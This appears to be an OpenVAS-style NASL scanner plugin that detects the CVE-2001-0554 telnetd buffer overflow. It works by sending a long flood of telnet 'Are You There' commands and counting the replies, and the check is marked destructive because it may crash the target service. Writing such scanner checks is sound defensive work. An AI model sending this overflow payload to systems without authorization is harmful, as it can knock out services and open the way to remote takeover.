if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10709" );
	script_version( "2020-11-19T14:17:11+0000" );
	script_tag( name: "last_modification", value: "2020-11-19 14:17:11 +0000 (Thu, 19 Nov 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_xref( name: "IAVA", value: "2001-t-0008" );
	script_bugtraq_id( 3064 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2001-0554" );
	script_name( "TESO in.telnetd buffer overflow" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2001 Pavel Kankovsky" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "telnetserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/telnet", 23 );
	script_mandatory_keys( "telnet/banner/available" );
	script_xref( name: "URL", value: "http://www.team-teso.net/advisories/teso-advisory-011.tar.gz" );
	script_tag( name: "solution", value: "Comment out the 'telnet' line in /etc/inetd.conf." );
	script_tag( name: "summary", value: "The Telnet server does not return an expected number of replies
  when it receives a long sequence of 'Are You There' commands. This probably means it overflows one
  of its internal buffers and crashes." );
	script_tag( name: "impact", value: "It is likely an attacker could abuse this bug to gain
  control over the remote host's superuser." );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("telnet_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
iac_ayt = raw_string( 0xff, 0xf6 );
iac_ao = raw_string( 0xff, 0xf5 );
iac_will_naol = raw_string( 0xff, 0xfb, 0x08 );
iac_will_encr = raw_string( 0xff, 0xfb, 0x26 );
func count_ayt( sock, max ){
	num = 0;
	state = 0;
	bytes = 100 * max;
	for(;bytes >= 0;){
		a = recv( socket: sock, length: 1024 );
		if(!a){
			return ( num );
		}
		bytes = bytes - strlen( a );
		for(i = 0;i < strlen( a );i = i + 1){
			newstate = 0;
			if(( state == 0 ) && ( ( a[i] == "y" ) || ( a[i] == "Y" ) )){
				newstate = 1;
			}
			if(( state == 1 ) && ( a[i] == "e" )){
				newstate = 2;
			}
			if(( state == 2 ) && ( a[i] == "s" )){
				num = num + 1;
				if(num >= max){
					return ( num );
				}
				newstate = 0;
			}
			state = newstate;
		}
	}
	return ( -1 );
}
func attack( port, negotiate ){
	succ = 0;
	soc = open_sock_tcp( port );
	if(!soc){
		return ( 0 );
	}
	if( negotiate ) {
		r = telnet_negotiate( socket: soc );
	}
	else {
		send( socket: soc, data: iac_will_naol );
		send( socket: soc, data: iac_will_encr );
		r = 1;
	}
	if(r){
		send( socket: soc, data: iac_ayt );
		r = count_ayt( sock: soc, max: 1 );
		if(r >= 1){
			total = 2048;
			size = total * strlen( iac_ayt );
			bomb = iac_ao + crap( length: size, data: iac_ayt );
			send( socket: soc, data: bomb );
			r = count_ayt( sock: soc, max: total );
			if(( r >= 0 ) && ( r < total )){
				succ = 1;
			}
		}
	}
	close( soc );
	return ( succ );
}
port = telnet_get_port( default: 23 );
success = attack( port: port, negotiate: 0 );
if(!success){
	success = attack( port: port, negotiate: 1 );
}
if(success){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

